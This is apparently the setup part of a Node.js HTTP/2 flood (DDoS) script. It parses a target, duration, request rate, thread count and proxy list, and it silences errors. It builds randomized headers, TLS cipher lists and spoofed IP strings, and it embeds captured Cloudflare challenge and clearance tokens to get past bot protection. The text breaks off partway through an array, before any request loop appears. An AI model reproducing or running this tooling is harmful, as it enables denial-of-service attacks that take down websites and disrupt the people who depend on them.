
const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

const target = process.argv[2];
const time = process.argv[3];
const Rate = process.argv[4];
const threads = process.argv[5];
const proxyFile = process.argv[6];
const inputIndex = process.argv.indexOf('--input');
const input = inputIndex !== -1 && inputIndex + 1 < process.argv.length ? process.argv[inputIndex + 1] : undefined;
const refererIndex = process.argv.indexOf('--referer');
const refererValue = refererIndex !== -1 && refererIndex + 1 < process.argv.length ? process.argv[refererIndex + 1] : undefined;
const currentDate = new Date();
const targetDate = new Date('2050-05-22');

// Check if the current date is beyond the target date
if (currentDate > targetDate) {
   console.error('Error: Method has expired.');
   process.exit(1);
}

// Your main program logic here
if (!target || !time || !Rate || !threads || !proxyFile) {
   console.error(`Its Use is Secret :b`);
   process.exit(1);
}


const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID', 'ERR_SOCKET_BAD_PORT'];

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process
   .setMaxListeners(0)
   .on('uncaughtException', function (e) {
       if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
   })
   .on('unhandledRejection', function (e) {
       if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
   })
   .on('warning', e => {
       if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
   })
   .on("SIGHUP", () => {
       return 1;
   })
   .on("SIGCHILD", () => {
       return 1;
   });

const headers = {};
 function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
} 

function randstr(length) {
  const characters =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let result = "";
  const charactersLength = characters.length;
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}

const ip_spoof = () => {
  const getRandomByte = () => {
    return Math.floor(Math.random() * 255);
  };
  return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
};

const spoofed = ip_spoof();

const sig = [    
   'ecdsa_secp256r1_sha256',
   'ecdsa_secp384r1_sha384',
   'ecdsa_secp521r1_sha512',
   'rsa_pss_rsae_sha256',
   'rsa_pss_rsae_sha384',
   'rsa_pss_rsae_sha512',
   'rsa_pkcs1_sha256',
   'rsa_pkcs1_sha384',
   'rsa_pkcs1_sha512'
];

const pathts = [
   "/",
   "?page=1",
   "?page=2",
   "?page=3",
   "?category=news",
   "?category=sports",
   "?category=technology",
   "?category=entertainment", 
   "?sort=newest",
   "?filter=popular",
   "?limit=10",
   "?start_date=1989-06-04",
   "?end_date=1989-06-04",
   "?__cf_chl_rt_tk=nP2tSCtLIsEGKgIBD2SztwDJCMYm8eL9l2S41oCEN8o-1702888186-0-gaNycGzNCWU",
"?__cf_chl_rt_tk=yI__zhdK3yR99B6b9jRkQLlvIjTKu7_2YI33ZCB4Pbo-1702888463-0-gaNycGzNFGU",
"?__cf_chl_rt_tk=QbxNnnmC8FpmedkosrfaPthTMxzFMEIO8xa0BdRJFKI-1702888720-0-gaNycGzNFHs",
"?__cf_chl_rt_tk=ti1J.838lGH8TxzcrYPefuvbwEORtNOVSKFDISExe1U-1702888784-0-gaNycGzNClA",
"?__cf_chl_rt_tk=ntO.9ynonIHqcrAuXZJBTcTBAMsENOYqkY5jzv.PRoM-1702888815-0-gaNycGzNCmU",
"?__cf_chl_rt_tk=SCOSydalu5acC72xzBRWOzKBLmYWpGxo3bRYeHFSWqo-1702888950-0-gaNycGzNFHs",
"?__cf_chl_rt_tk=QG7VtKbwe83bHEzmP4QeG53IXYnD3FwPM3AdS9QLalk-1702826567-0-gaNycGzNE9A",
"?__cf_chl_rt_tk=C9XmGKQztFjEwNpc0NK4A3RHUzdb8ePYIAXXzsVf8mk-1702889060-0-gaNycGzNFNA",
"?__cf_chl_rt_tk=cx8R_.rzcHl0NQ0rBM0cKsONGKDhwNgTCO1hu2_.v74-1702889131-0-gaNycGzNFDs",
"?__cf_chl_rt_tk=AnEv0N25BNMaSx7Y.JyKS4CV5CkOfXzX1nyIt59hNfg-1702889155-0-gaNycGzNCdA",
"?__cf_chl_rt_tk=7bJAEGaH9IhKO_BeFH3tpcVqlOxJhsCTIGBxm28Uk.o-1702889227-0-gaNycGzNE-U",
"?__cf_chl_rt_tk=rrE5Pn1Qhmh6ZVendk4GweUewCAKxkUvK0HIKJrABRc-1702889263-0-gaNycGzNCeU",
"?__cf_chl_rt_tk=.E1V6LTqVNJd5oRM4_A4b2Cm56zC9Ty17.HPUEplPNc-1702889305-0-gaNycGzNCbs",
"?__cf_chl_rt_tk=a2jfQ24eL6.ICz01wccuN6sTs9Me_eIIYZc.94w6e1k-1702889362-0-gaNycGzNCdA",
"?__cf_chl_rt_tk=W_fRdgbeQMmtb6FxZlJV0AmS3fCw8Tln45zDEptIOJk-1702889406-0-gaNycGzNE9A",
"?__cf_chl_rt_tk=4kjttOjio0gYSsNeJwtzO6l1n3uZymAdJKiRFeyETes-1702889470-0-gaNycGzNCfs",
"?__cf_chl_rt_tk=Kd5MB96Pyy3FTjxAm55aZbB334adV0bJax.AM9VWlFE-1702889600-0-gaNycGzNCdA",
"?__cf_chl_rt_tk=v2OPKMpEC_DQu4NlIm3fGBPjbelE6GWpQIgLlWzjVI0-1702889808-0-gaNycGzNCeU",
"?__cf_chl_rt_tk=vsgRooy6RfpNlRXYe7OHYUvlDwPzPvAlcN15SKikrFA-1702889857-0-gaNycGzNCbs",
"?__cf_chl_rt_tk=EunXyCZ28KJNXVFS.pBWL.kn7LZdU.LD8uI7uMJ4SC4-1702889866-0-gaNycGzNCdA",
"?__cf_clearance=Q7cywcbRU3LhdRUppkl2Kz.wU9jjRLzq50v8a807L8k-1702889889-0-1-a33b4d97.d3187f02.f43a1277-160.0.0",
"?__cf_bm=ZOpceqqH3pCP..NLyk5MVC6eHuOOlnbTRPDtVGBx4NU-1702890174-1-AWt2pPHjlDUtWyMHmBUU2YbflXN+dZL5LAhMF+91Tf5A4tv5gRDMXiMeNRHnPzjIuO6Nloy0XYk56K77cqY3w9o=; cf_bm=kIWUsH8jNxV.ERL_Uc_eGsujZ36qqOiBQByaXq1UFH0-1702890176-1-AbgFqD6R4y3D21vuLJdjEdIHYyWWCjNXjqHJjxebTVt54zLML8lGpsatdxb/egdOWvq1ZMgGDzkLjiQ3rHO4rSYmPX/tF+HGp3ajEowPPoSh",
"?__cf_clearance=.p2THmfMLl5cJdRPoopU7LVD_bb4rR83B.zh4IAOJmE-1702890014-0-1-a33b4d97.179f1604.f43a1277-160.0.0",
"?__cf_clearance=YehxiFDP_T5Pk16Fog33tSgpDl9SS7XTWY9n3djMkdE-1702890321-0-1-a33b4d97.e83179e2.f43a1277-160.0.0",
"?__cf_clearance=WTgrd5qAue.rH1R0LcMkA9KuGXsDoq6dbtMRaBS01H8-1702890075-0-1-a33b4d97.75c6f2a1.e089e1cd-160.0.0",
"?__cf_chl_rt_tk=xxsEYpJGdX_dCFE7mixPdb_xMdgEd1vWjWfUawSVmFo-1702890787-0-gaNycGzNE-U", "?__cf_chl_rt_tk=4POs4SKaRth4EVT_FAo71Y.N302H3CTwamQUm1Diz2Y-1702890995-0-gaNycGzNCiU",
"?__cf_chl_rt_tk=ZYYAUS10.t94cipBUzrOANLleg6Y52B36NahD8Lppog-1702891100-0-gaNycGzNFGU",
"?__cf_chl_rt_tk=qFevwN5uCe.mV8YMQGGui796J71irt6PzuRbniOjK1c-1702891205-0-gaNycGzNChA",
"?__cf_chl_rt_tk=Jc1iY2xE2StE8vqebQWb0vdQtk0HQ.XkjTwCaQoy2IM-1702891236-0-gaNycGzNCiU",
"?__cf_chl_rt_tk=Xddm2Jnbx5iCKto6Jjn47JeHMJuW1pLAnGwkkvoRdoI-1702891344-0-gaNycGzNFKU",
"?__cf_chl_rt_tk=0bvigaiVIw0ybessA948F29IHPD3oZoD5zWKWEQRHQc-1702891370-0-gaNycGzNCjs",
"?__cf_chl_rt_tk=Vu2qjheswLRU_tQKx9.W1FM0JYjYRIYvFi8voMP_OFw-1702891394-0-gaNycGzNClA",
"?__cf_chl_rt_tk=8Sf_nIAkrfSFmtD.yNmqWfeMeS2cHU6oFhi9n.fD930-1702891631-0-gaNycGzNE1A",
"?__cf_chl_rt_tk=A.8DHrgyQ25e7oEgtwFjYx5IbLUewo18v1yyGi5155M-1702891654-0-gaNycGzNCPs",
"?__cf_chl_rt_tk=kCxmEVrrSIvRbGc7Zb2iK0JXYcgpf0SsZcC5JAV1C8g-1702891689-0-gaNycGzNCPs", "?page=1", "?page=2", "?page=3", "?category=news", "?category=sports", "?category=technology", "?category=entertainment", "?sort=newest", "?filter=popular", "?limit=10", "?start_date=1989-06-04", "?end_date=1989-06-04"
 ];

const cplist = [
 'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
 "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
 "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
 "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
 "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
 "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
 "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
 'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
 'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
 "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
 "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
 "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
 "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
 "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
 "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
 'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
 'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
 ':ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
 'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
   ];
   
const lang_header = ['ko-KR',
'en-US',
'zh-CN',
'zh-TW',
'ja-JP',
'en-GB',
'en-AU',
'en-GB,en-US;q=0.9,en;q=0.8',
'en-GB,en;q=0.5',
'en-CA',
'en-UK, en, de;q=0.5',
'en-NZ',
'en-GB,en;q=0.6',
'en-ZA',
'en-IN',
'en-PH',
'en-SG',
'en-HK',
'en-GB,en;q=0.8',
'en-GB,en;q=0.9',
' en-GB,en;q=0.7',
'*',
'en-US,en;q=0.5',
'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
'utf-8, iso-8859-1;q=0.5, *;q=0.1',
'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
'en-GB, en-US, en;q=0.9',
'de-AT, de-DE;q=0.9, en;q=0.5',
'cs;q=0.5',
'da, en-gb;q=0.8, en;q=0.7',
'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
'en-US,en;q=0.9',
'de-CH;q=0.7',
'tr',
'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
];

const encoding_header = [
   'gzip',
 'gzip, deflate, br',
 'compress, gzip',
 'deflate, gzip',
 'gzip, identity',
 'gzip, deflate',
 'br',
 'br;q=1.0, gzip;q=0.8, *;q=0.1',
 'gzip;q=1.0, identity; q=0.5, *;q=0',
 'gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25',
 'compress;q=0.5, gzip;q=1.0',
 'identity',
 'gzip, compress',
 'compress, deflate',
 'compress',
 'gzip, deflate, br',
 'deflate',
 'gzip, deflate, lzma, sdch',
 'deflate'
];

const control_header = [
   'max-age=604800',
 'proxy-revalidate',
 'public, max-age=0',
 'max-age=315360000',
 'public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800',
 's-maxage=604800',
 'max-stale',
 'public, immutable, max-age=31536000',
 'must-revalidate',
 'private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
 'max-age=31536000,public,immutable',
 'max-age=31536000,public',
 'min-fresh',
 'private',
 'public',
 's-maxage',
 'no-cache',
 'no-cache, no-transform',
 'max-age=2592000',
 'no-store',
 'no-transform',
 'max-age=31557600',
 'stale-if-error',
 'only-if-cached',
 'max-age=0',
 'must-understand, no-store',
 'max-age=31536000; includeSubDomains',
 'max-age=31536000; includeSubDomains; preload',
 'max-age=120',
 'max-age=0,no-cache,no-store,must-revalidate',
 'public, max-age=604800, immutable',
 'max-age=0, must-revalidate, private',
 'max-age=0, private, must-revalidate',
 'max-age=604800, stale-while-revalidate=86400',
 'max-stale=3600',
 'public, max-age=2678400',
 'min-fresh=600',
 'public, max-age=30672000',
 'max-age=31536000, immutable',
 'max-age=604800, stale-if-error=86400',
 'public, max-age=604800',
 'no-cache, no-store,private, max-age=0, must-revalidate',
 'o-cache, no-store, must-revalidate, pre-check=0, post-check=0',
 'public, s-maxage=600, max-age=60'
];

const platform = [
   "Windows",
   "Macintosh",
   "Linux",
   "Android",
   "PlayStation 4",
   "iPhone",
   "iPad",
   "Windows Phone",,
   "iOS",
   "Android",
   "PlayStation 5",
   "Xbox One",
   "Nintendo Switch",
   "Apple TV",
   "Amazon Fire TV",
   "Roku",
   "Chromecast",
   "Smart TV",
   "Other"
]

const cookie1 = [
   "--no-sandbox",
   "--disable-setuid-sandbox",
   "--disable-infobars",
   "--disable-logging",
   "--disable-login-animations",
   "--disable-notifications",
   "--disable-gpu",
   "--headless",
   "--lang=ko_KR",
   "--start-maxmized",
   "--ignore-certificate-errors",
   "--hide-scrollbars",
   "--mute-audio",
   "--disable-web-security",
   "--incognito",
   "--disable-canvas-aa",
   "--disable-2d-canvas-clip-aa",
   "--disable-accelerated-2d-canvas",
   "--no-zygote",
   "--use-gl=desktop",
   "--disable-gl-drawing-for-tests",
   "--disable-dev-shm-usage",
   "--no-first-run",
   "--disable-features=IsolateOrigins,site-per-process",
   "--ignore-certificate-errors-spki-list",
   "--user-agent=Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:107.0) Gecko/20110101 Firefox/107.0",
   "?__cf_chl_rt_tk=nP2tSCtLIsEGKgIBD2SztwDJCMYm8eL9l2S41oCEN8o-1702888186-0-gaNycGzNCWU",
   "?__cf_chl_rt_tk=yI__zhdK3yR99B6b9jRkQLlvIjTKu7_2YI33ZCB4Pbo-1702888463-0-gaNycGzNFGU",
   "?__cf_chl_rt_tk=QbxNnnmC8FpmedkosrfaPthTMxzFMEIO8xa0BdRJFKI-1702888720-0-gaNycGzNFHs",
   "?__cf_chl_rt_tk=ti1J.838lGH8TxzcrYPefuvbwEORtNOVSKFDISExe1U-1702888784-0-gaNycGzNClA",
   "?__cf_chl_rt_tk=ntO.9ynonIHqcrAuXZJBTcTBAMsENOYqkY5jzv.PRoM-1702888815-0-gaNycGzNCmU",
   "?__cf_chl_rt_tk=SCOSydalu5acC72xzBRWOzKBLmYWpGxo3bRYeHFSWqo-1702888950-0-gaNycGzNFHs",
   "?__cf_chl_rt_tk=QG7VtKbwe83bHEzmP4QeG53IXYnD3FwPM3AdS9QLalk-1702826567-0-gaNycGzNE9A",
   "?__cf_chl_rt_tk=C9XmGKQztFjEwNpc0NK4A3RHUzdb8ePYIAXXzsVf8mk-1702889060-0-gaNycGzNFNA",
   "?__cf_chl_rt_tk=cx8R_.rzcHl0NQ0rBM0cKsONGKDhwNgTCO1hu2_.v74-1702889131-0-gaNycGzNFDs",
   "?__cf_chl_rt_tk=AnEv0N25BNMaSx7Y.JyKS4CV5CkOfXzX1nyIt59hNfg-1702889155-0-gaNycGzNCdA",
   "?__cf_chl_rt_tk=7bJAEGaH9IhKO_BeFH3tpcVqlOxJhsCTIGBxm28Uk.o-1702889227-0-gaNycGzNE-U",
   "?__cf_chl_rt_tk=rrE5Pn1Qhmh6ZVendk4GweUewCAKxkUvK0HIKJrABRc-1702889263-0-gaNycGzNCeU",
   "?__cf_chl_rt_tk=.E1V6LTqVNJd5oRM4_A4b2Cm56zC9Ty17.HPUEplPNc-1702889305-0-gaNycGzNCbs",
   "?__cf_chl_rt_tk=a2jfQ24eL6.ICz01wccuN6sTs9Me_eIIYZc.94w6e1k-1702889362-0-gaNycGzNCdA",
   "?__cf_chl_rt_tk=W_fRdgbeQMmtb6FxZlJV0AmS3fCw8Tln45zDEptIOJk-1702889406-0-gaNycGzNE9A",
   "?__cf_chl_rt_tk=4kjttOjio0gYSsNeJwtzO6l1n3uZymAdJKiRFeyETes-1702889470-0-gaNycGzNCfs",
   "?__cf_chl_rt_tk=Kd5MB96Pyy3FTjxAm55aZbB334adV0bJax.AM9VWlFE-1702889600-0-gaNycGzNCdA",
   "?__cf_chl_rt_tk=v2OPKMpEC_DQu4NlIm3fGBPjbelE6GWpQIgLlWzjVI0-1702889808-0-gaNycGzNCeU",
   "?__cf_chl_rt_tk=vsgRooy6RfpNlRXYe7OHYUvlDwPzPvAlcN15SKikrFA-1702889857-0-gaNycGzNCbs",
   "?__cf_chl_rt_tk=EunXyCZ28KJNXVFS.pBWL.kn7LZdU.LD8uI7uMJ4SC4-1702889866-0-gaNycGzNCdA",
   "?__cf_clearance=Q7cywcbRU3LhdRUppkl2Kz.wU9jjRLzq50v8a807L8k-1702889889-0-1-a33b4d97.d3187f02.f43a1277-160.0.0",
